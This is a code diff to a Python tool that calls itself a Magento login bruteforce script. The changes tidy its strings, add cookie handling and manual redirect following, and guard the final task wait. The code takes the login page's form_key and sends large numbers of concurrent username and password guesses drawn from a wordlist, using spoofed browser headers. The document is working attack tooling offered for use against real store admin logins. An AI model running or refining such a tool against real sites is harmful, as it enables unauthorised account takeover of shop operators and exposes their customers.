@@ -51,21 +51,18 @@ parser = argparse.ArgumentParser(
     description='Yet another Magento login Bruteforce script.')
 parser.add_argument(
     "-u",
-    help="The username to bruteforce the password. Defaults\
-    to admin",
+    help="The username to bruteforce the password. Defaults to admin",
     default="admin")
 parser.add_argument(
     "-w",
     help="The password wordlist fullpath to use")
 parser.add_argument("-m",
-    help="Number. Max concurrent calls to try to schedulle.\
-          Defaults to 100.",
+    help="Number. Max concurrent calls to try to schedulle. Defaults to 100.",
     default=100,
     type=int)
 parser.add_argument(
     "-t",
-    help="Number. Time to wait between max concurrent blocks.\
-    Defaults to 1 secs.",
+    help="Number. Time to wait between max concurrent blocks. Defaults to 1 secs.",
     default=1,
     type=int)
 parser.add_argument(
@@ -79,39 +76,41 @@ async def gen(wordlist):
             yield i.strip()
 
 
-async def do_request(url, username, password):
+async def do_request(url, username, password, cookies={}):
     hg = {
         "Origin": url,
         "Referer": url,
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0)\
-        Gecko/20100101 Firefox/102.0",
-        "Accept":"text/html,application/xhtml+xml,application/xml;\
-        q=0.9,image/avif,image/webp,*/*;q=0.8"
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
     }
     hp = {
         "Content-Type":"application/x-www-form-urlencoded",
         "Origin":url,
         "Referer":url,
-        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0)\
-        Gecko/20100101 Firefox/102.0",
-        "Accept":"text/html,application/xhtml+xml,application/xml;\
-        q=0.9,image/avif,image/webp,*/*;q=0.8"
+        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
+        "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
     }
     async with aiohttp.ClientSession() as session:
-        async with session.get(url, headers=hg) as response:
+        async with session.get(url, headers=hg, cookies=cookies, allow_redirects=False) as response:
             t = await response.text()
+
+            if response.status > 299 and response.status < 400:
+                _ = await do_request(response.headers['Location'], username, password, response.cookies)
+                url = response.headers['Location']
+                return
+
             form_key = re.findall(
                 r'(?=value)value=\"(?P<value>[^\"]+)',
                 t)
+
             if form_key != None and len(form_key) == 1:
                 form_key = form_key[0]
-                data_str = f"form_key={form_key}&login%5Busername%5D\
-                    ={username}&login%5Bpassword%5D={password}"
+                data_str = f"form_key={form_key}&login%5Busername%5D={username}&login%5Bpassword%5D={password}"
 
                 async with session.post(
                     url,
                     data=data_str,
-                    cookies=response.cookies,
+                    cookies=cookies,
                     headers=hp,
                     allow_redirects=False) as response2:
 
@@ -168,7 +167,8 @@ async def main(
             j = 0
             await asyncio.sleep(ttime)
 
-    await asyncio.wait(tasks)
+    if len(tasks) > 0:
+        await asyncio.wait(tasks)
 
 
 
